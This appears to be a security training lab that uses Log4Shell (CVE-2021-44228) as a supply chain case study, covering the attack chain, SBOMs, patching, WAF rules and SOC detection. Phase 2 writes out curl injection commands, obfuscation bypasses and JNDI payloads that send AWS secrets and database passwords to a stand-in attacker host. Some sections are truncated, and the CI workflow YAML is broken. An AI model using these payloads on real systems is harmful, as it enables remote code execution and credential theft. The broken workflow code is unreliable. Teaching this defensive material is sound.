# Lab 6.9: Case Study. Log4Shell (CVE-2021-44228)

<div class="lab-meta">
  <span>~40 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="../../tier-1/1.1-dependency-resolution/">Lab 1.1</a></span>

On November 24, 2021, the Alibaba Cloud Security Team privately reported a vulnerability in Apache Log4j to the Apache Software Foundation. On December 9, the vulnerability was publicly disclosed as CVE-2021-44228. By December 10, mass exploitation was underway worldwide. Within 72 hours, every security team on the planet was scrambling to answer one question: "Do we use Log4j?"

Most organizations could not answer that question quickly because Log4j was not a direct dependency in their applications. It was a **transitive dependency**. buried two, three, or four levels deep in dependency trees. Your application uses Spring Boot, which uses spring-boot-starter-logging, which uses log4j-to-slf4j, which pulls in log4j-core. The developer never typed "log4j" in their `pom.xml`, but it was running in production.

Log4Shell is the definitive case study for why supply chain security is not optional. A single transitive dependency in a logging library gave attackers unauthenticated remote code execution on any Java application that logged user-controlled input. which is effectively every Java application. The vulnerability had a CVSS score of 10.0 and affected an estimated 93% of enterprise cloud environments.

In this lab, you will study the attack mechanism, trace Log4j through a dependency tree, understand why the response was so chaotic, and build the detection and prevention controls that would have reduced the impact.

???+ info "Phase 1: UNDERSTAND. What Log4j Is and Why It Mattered"

    **Goal:** Understand the Log4Shell timeline, what Log4j does, why JNDI lookups existed, and why this is fundamentally a supply chain problem.

### The timeline

| Date | Event |
|------|-------|
| 2013 | Log4j 2.0 released with JNDI lookup support enabled by default |
| 2021-11-24 | Alibaba Cloud Security Team privately reports CVE-2021-44228 to Apache |
| 2021-12-06 | Apache releases Log4j 2.15.0 (partial fix) |
| 2021-12-09 | CVE-2021-44228 publicly disclosed; PoC exploits appear within hours |
| 2021-12-10 | Mass exploitation begins worldwide |
| 2021-12-13 | CVE-2021-45046. the 2.15.0 fix was incomplete; Log4j 2.16.0 released |
| 2021-12-18 | CVE-2021-45105. DoS vulnerability in 2.16.0; Log4j 2.17.0 released |
| 2021-12-28 | CVE-2021-44832. RCE via JDBC Appender; Log4j 2.17.1 released |
| 2022-01 | CISA orders all federal agencies to patch by December 24 (extended) |

Four CVEs in three weeks. Each "fix" introduced or revealed another vulnerability. Organizations that patched to 2.15.0 had to patch again to 2.16.0, then again to 2.17.0, then again to 2.17.1.

### Step 1: What is Log4j?

```bash
cat /app/analysis/what-is-log4j.txt
```

Apache Log4j is a **Java logging framework** used by virtually every Java application. It is the standard logging library in the Java ecosystem. When a Java developer writes:

```java
logger.info("User {} logged in from {}", username, ipAddress);
```

Log4j formats and writes that log message. It is as fundamental to Java as `console.log` is to JavaScript or `print` is to Python.

Log4j was used by Apache Solr, Apache Druid, Apache Struts, Elasticsearch, Minecraft, VMware vCenter, Cisco products, and thousands of other applications and services.

### Step 2: The JNDI lookup feature

The vulnerability was in Log4j's **message lookup** feature. Log4j supported variable interpolation in log messages using `${}` syntax. One of the supported lookup types was **JNDI** (Java Naming and Directory Interface):

```
${jndi:ldap://some-server/resource}
```

When Log4j encountered this pattern in **any logged string**, it performed a network lookup to the specified server. This was a feature, not a bug. it was designed for looking up configuration values from directory services.

The problem: any user-controlled input that gets logged becomes an attack vector.

```
# HTTP request with malicious User-Agent header
GET / HTTP/1.1
User-Agent: ${jndi:ldap://attacker.com/exploit}
```

When the application logs the User-Agent (which virtually every web application does), Log4j resolves the JNDI expression, connects to the attacker's LDAP server, and executes whatever Java class the LDAP server returns.

### Step 3: The full attack chain

```
1. Attacker sends request with JNDI payload in any logged field
   (User-Agent, X-Forwarded-For, username, search query, etc.)
         │
2. Application logs the input using Log4j
   logger.info("Request from: {}", userAgent);
         │
3. Log4j's message formatter encounters ${jndi:ldap://attacker.com/a}
         │
4. Log4j performs JNDI lookup -- connects to attacker's LDAP server
         │
5. Attacker's LDAP server returns a reference to a malicious Java class
   hosted at http://attacker.com/Exploit.class
         │
6. JVM downloads and instantiates the malicious class
         │
7. Attacker has Remote Code Execution on the server
```

### Step 4: Why this is a supply chain problem

```bash
cat /app/pom.xml
```

Examine the `pom.xml`. the developer's direct dependencies are Spring Boot Web, Spring Data JPA, and PostgreSQL. **Log4j does not appear anywhere in the file.** It arrives as a transitive dependency:

```
com.acme:acme-webapp:3.2.1
  └── org.springframework.boot:spring-boot-starter-web:2.6.1
        └── org.springframework.boot:spring-boot-starter:2.6.1
              └── org.springframework.boot:spring-boot-starter-logging:2.6.1
                    └── org.apache.logging.log4j:log4j-to-slf4j:2.14.1
                          └── org.apache.logging.log4j:log4j-api:2.14.1
```

```bash
cat /app/dependency-tree.txt
```

The developer never chose Log4j. They chose Spring Boot. Spring Boot chose a logging starter. The logging starter chose Log4j. This is the supply chain problem: **you are running code you did not choose, from maintainers you do not know, with features you did not ask for.**

???+ warning "Phase 2: ANALYZE. The Attack Mechanism and Response Chaos"

    **Goal:** Walk through the technical exploitation, understand the obfuscation bypasses, and trace the chaotic multi-CVE response.

### Step 1: Basic exploitation

The simplest Log4Shell payload:

```
${jndi:ldap://attacker.com/a}
```

This can be injected anywhere that gets logged:

```bash
# HTTP headers
curl -H "User-Agent: \${jndi:ldap://attacker.com/a}" http://target/

# URL parameters
curl "http://target/search?q=\${jndi:ldap://attacker.com/a}"

# Form fields
curl -X POST http://target/login -d "username=\${jndi:ldap://attacker.com/a}"

# Even in 404 paths
curl "http://target/\${jndi:ldap://attacker.com/a}"
```

### Step 2: Obfuscation bypasses

The first WAF rules blocked `${jndi:`. attackers immediately found bypasses using Log4j's own lookup features:

```bash
echo "
Log4Shell obfuscation techniques:

1. Case variation (Log4j is case-insensitive for lookup names):
   \${jndi:LDAP://attacker.com/a}
   \${JNDI:ldap://attacker.com/a}

2. Nested lookups (Log4j resolves inner expressions first):
   \${j\${::-n}di:ldap://attacker.com/a}
   \${\${lower:j}ndi:ldap://attacker.com/a}
   \${\${upper:J}NDI:ldap://attacker.com/a}

3. Environment variable lookups (data exfiltration without RCE):
   \${jndi:ldap://attacker.com/\${env:AWS_SECRET_ACCESS_KEY}}
   \${jndi:dns://attacker.com/\${env:DB_PASSWORD}}

4. Unicode encoding:
   %24%7Bjndi:ldap://attacker.com/a%7D

5. Double encoding:
   %2524%257Bjndi:ldap://attacker.com/a%257D
"
```

### Step 3: Why SBOM would have helped

```bash
cat /app/sbom.json | python3 -m json.tool
```

If organizations had generated SBOMs before the Log4Shell disclosure, they could have answered "Do we use Log4j?" in minutes by querying their SBOM inventory:

```bash
# With an SBOM, finding affected applications is a database query:
cat /app/sbom.json | python3 -c "
import json, sys
sbom = json.load(sys.stdin)
for comp in sbom.get('components', []):
    if 'log4j' in comp.get('name', '').lower():
        print(f\"  AFFECTED: {comp['group']}:{comp['name']}:{comp['version']}\")
"
```

Without an SBOM, organizations had to:

1. Manually search every repository for Log4j references
2. Run `mvn dependency:tree` on every Java project
3. Search every JAR file on every server: `find / -name "log4j-core-*.jar"`
4. Check vendor advisories for every third-party product
5. This took **days to weeks** while exploitation was ongoing

### Step 4: The multi-CVE response chaos

```bash
echo "
The patching nightmare:

CVE-2021-44228 (Dec 9):  CVSS 10.0 - RCE via JNDI lookup
  Fix: Log4j 2.15.0 -- disabled JNDI by default
  Problem: The fix was incomplete

CVE-2021-45046 (Dec 14): CVSS 9.0 - RCE in non-default configs
  Fix: Log4j 2.16.0 -- removed JNDI lookup entirely
  Problem: DoS still possible

CVE-2021-45105 (Dec 18): CVSS 7.5 - DoS via recursive lookup
  Fix: Log4j 2.17.0 -- fixed recursive lookup
  Problem: Another RCE found

CVE-2021-44832 (Dec 28): CVSS 6.6 - RCE via JDBC Appender
  Fix: Log4j 2.17.1 -- final fix

Organizations that patched on Dec 10 to 2.15.0 had to patch again
on Dec 14, again on Dec 18, and again on Dec 28.
"
```

### Step 5: The mitigation options

While patching, organizations had three mitigation options:

```bash
echo "
Mitigation options (in order of preference):

1. UPGRADE Log4j to 2.17.1+ (the real fix)

2. SET SYSTEM PROPERTY: -Dlog4j2.formatMsgNoLookups=true
   Only works for 2.10.0+, does NOT fix CVE-2021-45046

3. REMOVE JndiLookup class from classpath:
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

4. WAF RULES: Block JNDI patterns (incomplete, can be bypassed)
"
```

    **Goal:** Extract the systemic lessons from Log4Shell about transitive dependencies, SBOM, and vulnerability response.

### Lesson 1: SBOM is not optional

```bash
echo "
Before Log4Shell:
  - SBOM was a nice-to-have, compliance checkbox
  - Most organizations had no inventory of transitive dependencies
  - 'We dont use Log4j' was a common (and wrong) assumption

After Log4Shell:
  - US Executive Order 14028 mandates SBOM for federal software
  - NTIA published minimum elements for SBOMs
  - CycloneDX and SPDX adoption accelerated
  - 'Generate SBOM' became a CI/CD pipeline step
"
```

Generate an SBOM from the vulnerable `pom.xml`:

```bash
# In a real environment:
# mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom

# In this lab, examine the pre-generated SBOM:
cat /app/sbom.json | python3 -c "
import json, sys
sbom = json.load(sys.stdin)
print('SBOM Components:')
for comp in sbom.get('components', []):
    name = f\"{comp.get('group', '')}:{comp['name']}:{comp['version']}\"
    if 'log4j' in name.lower():
        print(f'  [VULNERABLE] {name}')
    else:
        print(f'  [OK] {name}')

print()
print('Dependency Path to Log4j:')
for dep in sbom.get('dependencies', []):
    for child in dep.get('dependsOn', []):
        if 'log4j' in child.lower():
            print(f'  {dep[\"ref\"]} -> {child}')
"
```

### Lesson 2: Transitive dependency visibility is critical

The developer's `pom.xml` has 3 direct dependencies. The actual dependency tree has 50+ transitive dependencies. Any of those transitive dependencies can introduce vulnerabilities.

```bash
# Trace the full path from your app to the vulnerable component:
echo "
Your app: com.acme:acme-webapp:3.2.1
  Direct dep: spring-boot-starter-web:2.6.1
    Transitive: spring-boot-starter:2.6.1
      Transitive: spring-boot-starter-logging:2.6.1
        Transitive: log4j-to-slf4j:2.14.1
          Transitive: log4j-api:2.14.1

Depth: 5 levels deep
Developer awareness: ZERO
"
```

Tools for transitive dependency visibility:

```bash
echo "
Maven:     mvn dependency:tree
Gradle:    gradle dependencies
npm:       npm ls --all
pip:       pipdeptree
Go:        go mod graph
"
```

### Lesson 3: Vulnerability scanning must cover the full tree

```bash
echo "
Scanning just direct dependencies would NOT find Log4j.
Your scanner must:

1. Resolve the complete dependency tree (all transitive deps)
2. Match every component against vulnerability databases (NVD, OSV)
3. Report the dependency PATH so you know WHY you have the component
4. Run on every build, not just periodic scans
5. Alert on new CVEs for existing dependencies (continuous monitoring)
"
```

### Lesson 4: Patching strategy matters

```bash
echo "
Log4Shell patching lessons:

1. Pin to EXACT versions, not ranges:
   BAD:  log4j-core:2.14+     (could resolve to vulnerable version)
   GOOD: log4j-core:2.17.1    (exact safe version)

2. Override transitive dependency versions:
   In Maven: use <dependencyManagement> to force the safe version
   In npm: use 'overrides' or 'resolutions'

3. Have a fast-path patching process:
   - Identify affected apps (requires SBOM)
   - Test with new version (requires CI/CD)
   - Deploy (requires automated deployment)
   - Verify (requires vulnerability scanning post-deploy)

4. Accept that first patches may be incomplete:
   - Log4Shell required FOUR patches over three weeks
   - Build processes that can redeploy quickly
"
```

??? danger "Phase 4: DETECT. Finding Log4Shell in the Wild"

    **Goal:** Build detection for Log4Shell exploitation attempts using WAF rules, network indicators, process monitoring, and SIEM queries.

### WAF Rules

```bash
cat /app/waf-rules.conf
```

The WAF rules detect JNDI injection patterns including common obfuscation bypasses. Key rules:

1. **Basic JNDI pattern**: `${jndi:ldap://...}`
2. **Case-insensitive matching**: `${JNDI:LDAP://...}`
3. **Nested lookup obfuscation**: `${${lower:j}ndi:...}`
4. **Separator obfuscation**: `${j${::-n}di:...}`
5. **URL-encoded variants**: `%24%7Bjndi:`

**Important:** WAF rules are a mitigation, not a fix. New obfuscation bypasses were discovered daily during the Log4Shell crisis. The only real fix is upgrading Log4j.

### Network Indicators

| Indicator | Protocol | Description |
|-----------|----------|-------------|
| Outbound LDAP to non-internal servers | LDAP/TCP 389, 636 | JNDI LDAP lookup triggered by exploit |
| Outbound LDAP on non-standard ports | TCP any | Attackers use random ports to evade detection |
| Outbound RMI connections | RMI/TCP 1099 | Alternative JNDI protocol used in exploits |
| DNS queries with encoded data | DNS/UDP 53 | `${jndi:dns://attacker.com/${env:SECRET}}` exfiltration |
| Java process spawning shell commands | Process | Post-exploitation: `java` spawning `bash`, `curl`, `wget` |

### SIEM Detection Queries

### Process Monitoring Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `java` process making outbound LDAP connection | Network | JNDI lookup triggered by exploit payload |
| `java` spawning `bash`, `sh`, `curl`, `wget` | Process | Post-exploitation command execution |
| `java` connecting to a recently registered domain | Network | C2 server for exploit delivery |
| High DNS query rate from `java` process | DNS | DNS-based JNDI data exfiltration |
| New `.class` files in `/tmp/` created by `java` | File | Downloaded malicious Java class from LDAP response |

??? tip "SOC Relevance"

    **Alerts you will see:**

    - "JNDI injection pattern detected in HTTP request" (WAF/IDS)
    - "Outbound LDAP connection from application server to external IP" (firewall/NDR)
    - "Java process spawned shell command" (EDR)
    - "DNS query with encoded data from application server" (DNS monitoring)

    **Why this matters to your SOC:** Log4Shell demonstrated that a vulnerability in a transitive dependency can affect every Java application simultaneously. The attack surface was unprecedented: any input that gets logged is an attack vector. During the initial response, SOCs were overwhelmed by the volume of scanning activity (both attackers probing and defenders testing their own systems). The obfuscation bypasses meant that signature-based detection was a cat-and-mouse game. new bypasses appeared faster than WAF rules could be updated.

    **Triage workflow:**

    1. **Determine if the target is vulnerable**. check if Log4j 2.x (< 2.17.1) is in the dependency tree (this is where SBOM pays off)
    2. **Analyze the JNDI payload**. extract the callback URL/IP; is it a known scanner, a researcher, or an actual attacker?
    3. **Check for successful exploitation**. did the application server make an outbound LDAP/RMI connection to the callback address?
    4. **Check for post-exploitation**. did the Java process spawn any child processes? Any new files in `/tmp/`? Any unusual network connections?
    5. **If exploited: full incident response**. assume the server is compromised; isolate, preserve evidence, check lateral movement
    6. **Patch immediately**. upgrade to Log4j 2.17.1+ or remove the JndiLookup class

    **False positive rate:** Low for exploitation detection (outbound LDAP from app servers is abnormal). High for WAF/IDS (massive scanning volume from researchers and automated tools). Focus on **successful exploitation indicators** (outbound connections, post-exploitation) rather than just injection attempts.

    Detect Log4j in your dependency tree and generate SBOM as part of CI.

    **`.github/workflows/log4j-check.yml`:**

    ```yaml
    name: Log4j / Transitive Dependency Check

    on:
      pull_request:
        paths:
          - "pom.xml"
          - "**/pom.xml"
          - "build.gradle"
          - "**/build.gradle"
      schedule:
        - cron: "0 6 * * 1"  # Weekly Monday 6 AM

    jobs:
      dependency-check:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4

          - name: Set up Java
            uses: actions/setup-java@v4

              distribution: 'temurin'
              java-version: '17'

          - name: Generate dependency tree
            run: |
              mvn dependency:tree -DoutputFile=dependency-tree.txt
              echo "--- Full Dependency Tree ---"
              cat dependency-tree.txt

          - name: Check for vulnerable Log4j versions
            run: |
              if grep -E "log4j-core:2\.(0|[0-9]|1[0-6])\." dependency-tree.txt; then

                echo "Upgrade to Log4j 2.17.1+ or override the transitive dependency."

              name: sbom
              path: target/bom.json

            with:
              scan-args: |-

    ```

## What You Learned

1. **Log4Shell was a supply chain vulnerability**. Log4j was a transitive dependency that most organizations did not know they used. The developer never chose it; it arrived through the dependency tree.
2. **JNDI lookup in a logging library was an RCE vector**. any user-controlled input that gets logged could trigger remote code execution, making the attack surface nearly universal.
3. **SBOM would have drastically reduced response time**. organizations with SBOMs could answer "Do we use Log4j?" in minutes. Organizations without SBOMs took days or weeks.
4. **The first patch was not the last**. four CVEs in three weeks meant organizations had to patch repeatedly. Fast-path patching processes and automated deployment are essential.
5. **WAF rules are a mitigation, not a fix**. obfuscation bypasses were discovered daily. The only real fix was upgrading Log4j or removing the JndiLookup class.
6. **Transitive dependency visibility is a security requirement**. if you cannot see your full dependency tree, you cannot assess your exposure to supply chain vulnerabilities.
